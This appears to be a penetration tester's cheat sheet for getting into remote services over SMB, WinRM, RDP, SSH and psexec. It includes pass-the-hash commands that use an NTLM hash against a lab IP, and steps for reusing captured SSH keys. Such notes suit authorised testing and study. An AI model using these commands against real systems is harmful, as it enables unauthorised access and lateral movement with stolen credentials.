# Remote Service Access 

### SMB

1. `impacket-smbclient [[domain/]username[:password]@]<targetName or address> `
- hashes are also accepted `-hashes`

2. smbclient \\\\192.168.199.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b 

### RPC / WinRM

1. `evil-winrm -i IP -u USER`
- hashes are also accepted `-H`

### RDP (remote desktop)

1. `xfreerdp /u:<user> /p:<pass> /v:<server>`
- can set hight of screen with `/h:<pixels>`

2. `Rdesktop <target IP>`
   
### SSH (setting up keys)
1. ssh -i id_rsa -p 2222 dave@192.168.230.201
- chmod 600 id_rsa 
2. Setting up key based authentication
- `chmod 0700 ~/.ssh`
- Copy `id_rsa` and `id_rsa.pub` files to kali
- mv `id_rsa` to the `~/.ssh` direcorty and chmod with 600 permisions
- mv `id_rsa.pub` to `~/.ssh` and rename it as `authorized_keys`

### psexec

1. if SMB share is writable and RPC are open then psexec could be the method of authentication 
- `impacket-psexec [[domain/]username[:password]@]<targetName or address>`
  
2. impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212
- The first argument is -hashes, which allows us to use NTLM hashes to authenticate to the target. The format is "LMHash:NTHash", in which we specify the Administrator NTLM hash after the colon. Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.
